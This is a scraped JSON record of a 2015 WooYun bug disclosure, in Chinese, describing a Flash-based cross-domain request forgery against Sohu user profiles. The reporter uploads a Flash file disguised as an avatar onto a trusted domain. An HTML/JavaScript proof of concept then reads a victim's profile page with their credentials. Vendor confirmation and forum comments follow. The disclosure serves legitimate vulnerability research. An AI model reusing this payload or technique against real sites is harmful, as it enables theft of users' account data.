{"id": 30559, "wybug_id": "wooyun-2015-0116281", "wybug_title": "搜狐劫持任意用户#2（需交互）", "wybug_corp": "搜狐", "wybug_author": "jeary", "wybug_date": "2015-05-26 16:35", "wybug_open_date": "2015-07-10 16:42", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向公众公开  简要描述： 这次不是搜狐视频,是搜狐的用户 详细说明：  求送小狐狸~~还是来看过程吧.\n\n很可惜，搜狐的用户中心并没有直接向上次那样设置*，但是这无法阻挡跨站师的脚步我们只需要让flash在它自己域即可\n*.sohu.com*.sohu.com.cn*.itc.cn\n于是开始找上传.http://i.sohu.com/profile/home/swfUploadIcon.htm（修改资料上传头像）\n\n然后发现运气并没有这么好，上传失败，应该是验证了文件内容，没有发现图片头信息\n\n然后..\n\n这次上传成功了，得到这样一个地址，你没看错，它就在crossdomain所配置的信任域里\nhttp://sucimg.itc.cn/avatarimg/s_247083258_1432619329154_c175\n然后访问之，结果下载了，我还以为不能用，果断下载回来对比一下原文件，发现是一样的然后构造POC请求用户的资料页面：\n<html><head><title>csrftest</title><script>function Connection(Sendtype,url,content,callback){\tif (window.XMLHttpRequest){\t\tvar xmlhttp=new XMLHttpRequest();\t}\telse{\t\tvar xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\t} \txmlhttp.onreadystatechange=function(){\t\tif(xmlhttp.readyState==4&&xmlhttp.status==200)\t\t{\t\t\tcallback(xmlhttp.responseText);\t\t}\t}\txmlhttp.open(Sendtype,url,true);\txmlhttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");    xmlhttp.withCredentials = \"true\";\txmlhttp.send(content);}  function sendToJavaScript(strData){    var theDiv = document.getElementById(\"HijackedData\");    var content = document.createTextNode(strData);    theDiv.appendChild(content);    theDiv.innerHTML += '<br/>'    //var posturl = \"\";    //var postdata= \"detaildesc=hack\";     //Connection(\"POST\",posturl,postdata,function(callback){});   }</script></head><body><div id=HijackedData></div><object id=\"myObject\" width=\"100\" height=\"100\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\" data=\"http://sucimg.itc.cn/avatarimg/s_247083258_1432619329154_c175\"><param name=\"AllowScriptAccess\" value=\"always\"><param name=\"flashvars\" value=\"input=http://i.sohu.com/v2/profile/home/basic.htm\"></object></body></html>\n   漏洞证明：  \n\n然后就没有然后了   修复方案：  摩擦摩擦.   版权声明：转载请注明来源 jeary@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-26 16:40 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-10 13:17 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:71        | I'm Me_Fortune)\t\t \n  楼主Flash跨站有教程没，看得一愣一愣的    \n     2015-07-10 14:01 |    \t\tjeary \t\t\t( 普通白帽子  |\t\t\t        Rank:296 漏洞数:106        | (:‮.kcaH eb nac gnihtynA))\t\t \n  @Me_Fortune jeary.org  博客第二页~~    \n     2015-07-10 14:06 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:71        | I'm Me_Fortune)\t\t \n  @jeary thx T_T    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}